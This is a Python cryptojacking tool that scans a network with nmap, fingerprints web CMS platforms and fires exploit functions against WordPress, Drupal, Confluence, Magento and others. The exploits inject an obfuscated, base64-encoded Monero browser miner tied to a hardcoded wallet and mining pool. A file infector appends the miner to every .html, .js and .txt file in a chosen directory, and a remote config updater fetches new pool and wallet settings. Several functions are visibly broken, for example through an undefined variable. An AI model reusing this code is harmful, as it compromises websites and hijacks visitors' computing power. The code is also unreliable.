import os
import subprocess
import time
import requests
import logging
import json
import tempfile
import sys
import base64
from bs4 import BeautifulSoup
import re
import urllib.parse
import nmap
from fake_useragent import UserAgent
import platform

# Configure logging
logging.basicConfig(
    filename=f'web_miner_{time.strftime("%Y%m%d_%H%M%S")}.log',
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)

# Configuration
CONFIG = {
    "CONFIG_UPDATE_URL": "https://raw.githubusercontent.com/lifewithoutcodes/mining-scripts/main/config.txt",
    "WEB_SCAN_TIMEOUT": 8,
    "SCAN_IP_RANGE": "192.168.1.0/24",
    "PORT_SCAN_RANGE": "80,443,8080",
    "NVD_API_URL": "https://services.nvd.nist.gov/rest/json/cves/2.0",
    "NVD_API_KEY": "5488ca5e-b6fe-40bd-a8c0-c41c08fa64cd",
    "POOL_URL": "wss://webminer.moneroocean.stream:443",
    "WALLET_ADDRESS": "4ADkuMYr8qrHQvaQNVoKh28Vt6gttrckp2kfum6eYWK7FWbmRjFT7rzacpbr6MiXYMMBUxFcGpYor2i2jgQKTZi4QwBjop9",
    "TARGET_EXTENSIONS": ['.html', '.js', '.txt']
}

# Obfuscated JavaScript Generator
def generate_obfuscated_miner():
    var_prefix = ''.join(chr(97 + (i % 26)) for i in range(8))
    encoded_wallet = base64.b64encode(CONFIG["WALLET_ADDRESS"].encode()).decode()
    encoded_pool = base64.b64encode(CONFIG["POOL_URL"].encode()).decode()
    miner_script = f"""
    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
    <script>
        (function() {{
            var {var_prefix}_server = atob("{encoded_pool}");
            var {var_prefix}_wallet = atob("{encoded_wallet}");
            var {var_prefix}_worker = "worker-" + Math.random().toString(36).substring(7);
            var {var_prefix}_threads = -1;
            var {var_prefix}_pass = "x";
            startMining({var_prefix}_wallet, {var_prefix}_worker, {var_prefix}_threads, {var_prefix}_pass);
            throttleMiner = 20;
            localStorage.setItem("{var_prefix}_miner", "active");
            console.log("Mining initialized");
            setInterval(function() {{
                if (!localStorage.getItem("{var_prefix}_miner")) {{
                    startMining({var_prefix}_wallet, {var_prefix}_worker, {var_prefix}_threads, {var_prefix}_pass);
                }}
            }}, 60000);
        }})();
    </script>
    """
    return miner_script

# Configuration Updater
class ConfigUpdater:
    def __init__(self, config):
        self.config = config
        self.platform = platform.system()

    def fetch_config(self):
        try:
            response = requests.get(self.config["CONFIG_UPDATE_URL"], timeout=10)
            response.raise_for_status()
            config_data = {}
            for line in response.text.splitlines():
                if '=' in line and not line.strip().startswith('#'):
                    key, value = line.split('=', 1)
                    config_data[key.strip()] = value.strip()
            logger.info(f"Fetched config: {config_data}")
            print("Fetched new configuration")
            return config_data
        except Exception as e:
            logger.error(f"Config fetch failed: {e}")
            print(f"Config fetch failed: {e}")
            return {}

    def apply_config(self, new_config):
        try:
            for key, value in new_config.items():
                if key in ["POOL_URL", "WALLET_ADDRESS"] and self.config.get(key) != value:
                    self.config[key] = value
                    logger.info(f"Updated {key} to {value}")
                    print(f"Updated {key} to {value}")
            return True
        except Exception as e:
            logger.error(f"Config apply failed: {e}")
            print(f"Config apply failed: {e}")
            return False

    def update_config(self):
        try:
            if self.platform == "Windows":
                ps_script = f"""
$ErrorActionPreference = 'Stop'
try {{
    $response = Invoke-WebRequest -Uri '{self.config["CONFIG_UPDATE_URL"]}' -TimeoutSec=10
    $config = {{}}
    foreach ($line in $response.Content -split "`n") {{
        if ($line -match '^([^=]+)=(.*)$' -and -not $line.Trim().StartsWith('#')) {{
            $config[$matches[1].Trim()] = $matches[2].Trim()
        }}
    }}
    $config | ConvertTo-Json | Out-File -FilePath 'temp_config.json' -Encoding utf8
}} catch {{
    Write-Error "Failed to fetch config: $_"
    exit 1
}}
"""
                with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False) as f:
                    f.write(ps_script)
                    ps_script_path = f.name
                subprocess.run(['powershell', '-File', ps_script_path], check=True)
                with open('temp_config.json', 'r') as f:
                    new_config = json.load(f)
                os.remove(ps_script_path)
                os.remove('temp_config.json')
                return self.apply_config(new_config)
            else:
                sh_script = f"""
#!/bin/sh
curl -s -m 10 '{self.config["CONFIG_UPDATE_URL"]}' > temp_config.txt
if [ $? -ne 0 ]; then
    exit 1
fi
cat temp_config.txt
"""
                with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False) as f:
                    f.write(sh_script)
                    sh_script_path = f.name
                os.chmod(sh_script_path, 0o755)
                result = subprocess.run([sh_script_path], capture_output=True, text=True, check=True)
                config_data = {}
                for line in result.stdout.splitlines():
                    if '=' in line and not line.strip().startswith('#'):
                        key, value = line.split('=', 1)
                        config_data[key.strip()] = value.strip()
                os.remove(sh_script_path)
                return self.apply_config(config_data)
        except Exception as e:
            logger.error(f"Config update failed: {e}")
            return False

# Document Infector
class DocumentInfector:
    def __init__(self):
        self.payload = generate_obfuscated_miner()
        logger.info("Initialized DocumentInfector")

    def infect_file(self, file_path):
        logger.info(f"Infecting file: {file_path}")
        try:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write('\n<!-- Miner Payload -->\n')
                f.write(self.payload)
            logger.info(f"Infected {file_path}")
            print(f"Infected {file_path}")
        except Exception as e:
            logger.error(f"Failed to infect {file_path}: {e}")
            print(f"Error infecting {file_path}: {e}")

    def infect_directory(self, directory):
        logger.info(f"Infecting directory: {directory}")
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    if any(file.endswith(ext) for ext in CONFIG["TARGET_EXTENSIONS"]):
                        self.infect_file(os.path.join(root, file))
            print(f"Finished infecting directory: {directory}")
        except Exception as e:
            logger.error(f"Error infecting directory {directory}: {e}")
            print(f"Error infecting directory {directory}: {e}")

# In-Memory Mining
def in_memory_mining():
    logger.info("Starting in-memory mining")
    try:
        import webbrowser
        miner_html = f"""
        <!DOCTYPE html>
        <html>
        <head><title>Mining</title></head>
        <body>
        {generate_obfuscated_miner()}
        </body>
        </html>
        """
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False) as f:
            f.write(miner_html)
            temp_html = f.name
        webbrowser.open(f'file://{temp_html}')
        logger.info("In-memory mining started via browser")
        print("Mining started in browser")
        time.sleep(60)
        os.remove(temp_html)
    except Exception as e:
        logger.error(f"In-memory mining failed: {e}")
        print(f"Mining failed: {e}")

# Web Scanner
class WebScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': UserAgent().random})
        self.nm = nmap.PortScanner()
        self.miner_injection = generate_obfuscated_miner()
        self.exploit_map = {
            'CVE-2018-7600': self.exploit_drupal_rce,
            'WordPress_File_Upload': self.exploit_wordpress_file_upload,
            'XSS_Injection': self.exploit_xss_injection,
            'CVE-2021-26084': self.exploit_confluence_rce,
            'CVE-2023-2453': self.exploit_craft_cms,
            'Magento_Upload': self.exploit_magento_upload,
            'Sitecore_RCE': self.exploit_sitecore_rce,
            'NextJS_XSS': self.exploit_nextjs_xss,
            'TYPO3_RCE': self.exploit_typo3_rce,
            'Umbraco_Upload': self.exploit_umbraco_upload,
            'Laravel_RCE': self.exploit_laravel_rce,
            'PHPFusion_XSS': self.exploit_phpfusion_xss
        }
        self.cve_cache = {}

    def scan_targets(self):
        try:
            print("Scanning for targets...")
            scan_result = self.nm.scan(hosts=CONFIG["SCAN_IP_RANGE"], arguments=f'-p {CONFIG["PORT_SCAN_RANGE"]} -sS')
            targets = []
            for host in scan_result['scan']:
                for proto in scan_result['scan'][host].all_protocols():
                    for port in scan_result['scan'][host][proto].keys():
                        if scan_result['scan'][host][proto][port]['state'] == 'open':
                            proto_prefix = 'https' if port == '443' else 'http'
                            targets.append(f"{proto_prefix}://{host}:{port}")
            targets = list(set(targets))
            logger.info(f"Found {len(targets)} targets")
            print(f"Found {len(targets)} targets")
            return targets
        except Exception as e:
            logger.error(f"Scan failed: {e}")
            print(f"Scan failed: {e}")
            return []

    def fingerprint_cms(self, url):
        try:
            if not url.startswith(('http://', 'https://')):
                url = f'http://{url}'
            print(f"Scanning {url}...")
            response = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            cms_info = {"platform": None, "version": None}
            if 'wp-content' in response.text:
                meta_generator = soup.find('meta', {'name': 'generator'})
                if meta_generator and 'WordPress' in meta_generator.get('content', ''):
                    version = re.search(r'WordPress (\d+\.\d+\.\d+)', meta_generator.get('content', ''))
                    cms_info["platform"] = "WordPress"
                    cms_info["version"] = version.group(1) if version else "Unknown"
            elif 'Drupal' in response.text:
                version = re.search(r'Drupal (\d+)', response.text)
                cms_info["platform"] = "Drupal"
                cms_info["version"] = version.group(1) if version else "Unknown"
            elif 'Joomla' in response.text:
                cms_info["platform"] = "Joomla"
            elif 'Magento' in response.text:
                cms_info["platform"] = "Magento"
            elif 'Laravel' in response.text:
                cms_info["platform"] = "Laravel"
            elif 'Craft CMS' in response.text:
                cms_info["platform"] = "Craft CMS"
            logger.info(f"Fingerprinted {url}: {cms_info}")
            print(f"CMS: {cms_info}")
            return cms_info
        except Exception as e:
            logger.error(f"Fingerprint failed for {url}: {e}")
            print(f"Fingerprint failed: {e}")
            return {"platform": None, "version": None}

    def query_nvd(self, platform, version):
        cache_key = f"{platform}:{version}"
        if cache_key in self.cve_cache:
            return self.cve_cache[cache_key]
        try:
            cpe = f"cpe:2.3:a:{platform.lower()}:{platform.lower()}:{version}:*:*:*:*"
            params = {'cpeName': cpe}
            headers = {'apiKey': CONFIG["NVD_API_KEY"]}
            response = self.session.get(CONFIG["NVD_API_URL"], params=params, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            cves = [item['cve']['id'] for item in data.get('vulnerabilities', [])]
            self.cve_cache[cache_key] = cves
            logger.info(f"Found {len(cves)} CVEs for {platform} {version}")
            return cves
        except Exception as e:
            logger.error(f"NVD query failed: {e}")
            return []

    def select_exploit(self, platform, version):
        try:
            cves = self.query_nvd(platform, version)
            for cve in cves:
                if cve in self.exploit_map:
                    logger.info(f"Selected exploit: {cve}")
                    return self.exploit_map[cve]
            if platform == "WordPress":
                return self.exploit_wordpress_file_upload
            elif platform == "Drupal":
                return self.exploit_drupal_rce
            elif platform == "Magento":
                return self.exploit_magento_upload
            elif platform == "Laravel":
                return self.exploit_laravel_rce
            return self.exploit_xss_injection
        except Exception as e:
            logger.error(f"Exploit selection failed: {e}")
            return self.exploit_xss_injection

    def exploit_wordpress_file_upload(self, url):
        try:
            upload_endpoint = urllib.parse.urljoin(url, 'wp/wp-admin/admin-ajax.php')
            php_shell = f'<?php file_put_contents("index.php", file_get_contents("index.php")."{self.miner_injection}"); ?>'
            files = {'file': ('miner.php', php_shell.encode(), 'application/php')}
            data = {'action': 'upload-attachment', '_nonce': '1234567890'}
            response = self.session.post(upload_endpoint, files=files, data=data, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
            if response.status_code == 200:
                check = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
                if self.miner_injection in check.text:
                    logger.info(f"WordPress exploit succeeded at {url}")
                    print(f"Exploit succeeded at {url}")
                    return True
            logger.warning(f"WordPress exploit failed at {url}")
            return False
        except Exception as e:
            logger.error(f"WordPress exploit error: {e}")
            return False

    def exploit_drupal_rce(self, url):
        try:
            endpoint = urllib.parse.urljoin(url, 'user/register?element_parents=account/mail/%23value&ajax_form=1')
            payload = {
                'form_id': 'user_register_form',
                '_drupal_ajax': '1',
                'mail[#post_render][]': 'exec',
                'mail[#type]': 'markup',
                'mail[#markup]': f'echo "{self.miner_injection}" >> index.php'
            }
            response = self.session.post(endpoint, data=payload, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
            if response.status_code == 200:
                check = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
                if self.miner_injection in check.text:
                    logger.info(f"Drupal exploit succeeded at {url}")
                    print(f"Exploit succeeded at {url}")
                    return True
            logger.warning(f"Drupal exploit failed at {url}")
            return False
        except Exception as e:
            logger.error(f"Drupal exploit error: {e}")
            return False

    def exploit_xss_injection(self, url):
        try:
            data = {'comment': self.miner_injection}
            response = self.session.post(f"{url}/comment.php", data=data, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
            if response.status_code == 200:
                check = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
                if self.miner_injection in check.text:
                    logger.info(f"XSS exploit succeeded at {url}")
                    print(f"Exploit succeeded at {url}")
                    return True
            logger.warning(f"XSS exploit failed at {url}")
            return False
        except Exception as e:
            logger.error(f"XSS exploit error: {e}")
            return False

    def exploit_confluence_rce(self, url):
        try:
            endpoint = urllib.parse.urljoin(url, 'rest/tinymce/1/macro/preview')
            payload = {'contentId': '123', 'macro': {'name': 'widget', 'body': self.miner_injection}}
            response = self.session.post(endpoint, json=payload, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
            if response.status_code == 200:
                check = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
                if self.miner_injection in check.text:
                    logger.info(f"Confluence exploit succeeded at {url}")
                    return True
            logger.warning(f"Confluence exploit failed at {url}")
            return False
        except Exception as e:
            logger.error(f"Confluence exploit error: {e}")
            return False

    def exploit_craft_cms(self, url):
        try:
            endpoint = urllib.parse.urljoin(url, 'index.php?p=admin/actions/users/save-user')
            payload = {'user': {'fields': {'bio': self.miner_injection}}}
            response = self.session.post(endpoint, data=payload, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
            if response.status_code == 200:
                check = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
                if self.miner_injection in check.text:
                    logger.info(f"Craft CMS exploit succeeded at {url}")
                    return True
            logger.warning(f"Craft CMS exploit failed at {url}")
            return False
        except Exception as e:
            logger.error(f"Craft CMS exploit error: {e}")
            return False

    def exploit_magento_upload(self, url):
        try:
            endpoint = urllib.parse.urljoin(url, 'admin/Cms_Wysiwyg/directive')
            payload = {'filter': self.miner_injection}
            response = self.session.post(endpoint, data=payload, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
            if response.status_code == 200:
                check = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
                if self.miner_injection in check.text:
                    logger.info(f"Magento exploit succeeded at {url}")
                    return True
            logger.warning(f"Magento exploit failed at {url}")
            return False
        except Exception as e:
            logger.error(f"Magento exploit error: {e}")
            return False

    def exploit_sitecore_rce(self, url):
        try:
            endpoint = urllib.parse.urljoin(url, 'sitecore/shell')
            payload = {'command': f'echo {self.miner_injection}'}
            response = self.session.post(endpoint, data=payload, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
            if response.status_code == 200:
                check = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
                if self.miner_injection in check.text:
                    logger.info(f"Sitecore exploit succeeded at {url}")
                    return True
            logger.warning(f"Sitecore exploit failed at {url}")
            return False
        except Exception as e:
            logger.error(f"Sitecore exploit error: {e}")
            return False

    def exploit_nextjs_xss(self, url):
        try:
            data = {'input': self.miner_injection}
            response = self.session.post(f"{url}/api/form", data=data, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
            if response.status_code == 200:
                check = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
                if self.miner_injection in check.text:
                    logger.info(f"Next.js XSS exploit succeeded at {url}")
                    return True
            logger.warning(f"Next.js exploit failed at {url}")
            return False
        except Exception as e:
            logger.error(f"Next.js exploit error: {e}")
            return False

    def exploit_typo3_rce(self, url):
        try:
            endpoint = urllib.parse.urljoin(url, 'typo3')
            payload = {'cmd': f'echo {self.miner_injection}'}
            response = self.session.post(endpoint, data=payload, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
            if response.status_code == 200:
                check = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
                if self.miner_injection in check.text:
                    logger.info(f"TYPO3 exploit succeeded at {url}")
                    return True
            logger.warning(f"TYPO3 exploit failed at {url}")
            return False
        except Exception as e:
            logger.error(f"TYPO3 exploit error: {e}")
            return False

    def exploit_umbraco_upload(self, url):
        try:
            endpoint = urllib.parse.urljoin(url, 'umbraco/backoffice/upload')
            files = {'file': ('miner.html', self.miner_injection.encode('utf-8'), 'text/html')}
            response = self.session.post(endpoint, files=files, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
            if response.status_code == 200:
                check = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
                if self.miner_injection in check.text:
                    logger.info(f"Umbraco exploit succeeded at {url}")
                    return True
            logger.warning(f"Umbraco exploit failed at {url}")
            return False
        except Exception as e:
            logger.error(f"Umbraco exploit error: {e}")
            return False

    def exploit_laravel_rce(self, url):
        try:
            endpoint = urllib.parse.urljoin(url, 'vendor')
            payload = {'cmd': f'echo "{self.miner_injection}"'}
            response = self.session.post(endpoint, data=payload, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
            if response.status_code == 200:
                check = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
                if self.miner_injection in check.text:
                    logger.info(f"Laravel exploit succeeded at {url}")
                    return True
            logger.warning(f"Laravel exploit failed at {url}")
            return False
        except Exception as e:
            logger.error(f"Laravel exploit error: {e}")
            return False

    def exploit_phpfusion_xss(self, url):
        try:
            data = {'message': self.miner_injection}
            response = self.session.post(f"{url}/messages.php", data=payload, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
            if response.status_code == 200:
                check = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
                if self.miner_injection in check.text:
                    logger.info(f"PHPFusion XSS exploit succeeded at {url}")
                    return True
            logger.warning(f"PHPFusion exploit failed at {url}")
            return False
        except Exception as e:
            logger.error(f"PHPFusion exploit error: {e}")
            return False

def display_menu():
    print("\n=== Web Miner Menu ===")
    print("1. Scan & Exploit")
    print("2. Update Config")
    print("3. Infect Directory")
    print("4. In-Memory Mining")
    print("5. Exit")
    return input("Choose option (1-5): ")

def main():
    print("Web Miner started")
    try:
        subprocess.run(["nmap", "-V"], check=True)
        print("Nmap ready")
    except:
        logger.critical("Nmap not installed")
        print("ERROR: Install Nmap")
        sys.exit(1)

    scanner = WebScanner()
    config_updater = ConfigUpdater(CONFIG)
    infector = DocumentInfector()

    while True:
        try:
            choice = display_menu()
            if choice == '1':
                targets = []
                method = input("1: Enter targets manually\n2: Load from targets.txt\nChoose (1-2): ")
                if method == '1':
                    user_input = input("Enter targets, comma-separated): ")
                    targets = [t.strip() for t in user_input.split(',') if t.strip()]
                elif method == '2':
                    try:
                        with open('targets.txt', 'r') as f:
                            targets = [t.strip() for t in f.read().split(',') if t.strip()]
                        print(f"Loaded {len(targets)} targets")
                    except:
                        print("ERROR: targets.txt not found")
                    continue
                else:
                    print("Invalid choice")
                    continue

                if targets:
                    for target in targets:
                        cms_info = scanner.fingerprint_cms(target)
                        if cms_info["platform"]:
                            exploit_func = scanner.select_exploit(cms_info["platform"], cms_info["version", "Unknown"])
                            exploit_func(target)
                    else:
                        print(f"No CMS found for {target}")

            elif choice == '2':
                print("Updating config...")
                if config_updater.update_config():
                    print("Config updated successfully")
                else:
                    print("Config update failed")

            elif choice == '3':
                directory = input("Enter directory path to infect: ")
                if os.path.isdir(directory):
                    infector.infect_directory(directory)
                else:
                    print(f"Invalid directory: {directory}")

            elif choice == '4':
                in_memory_mining()

            elif choice == '5':
                print("Exiting...")
                break

            else:
                print("Choose 1-5")

        except KeyboardInterrupt:
            print("\nInterrupted")
            break
        except Exception as e:
            logger.error(f"Error: {e}")
            print(f"Error: {e}")

if __name__ == "__main__":
    main()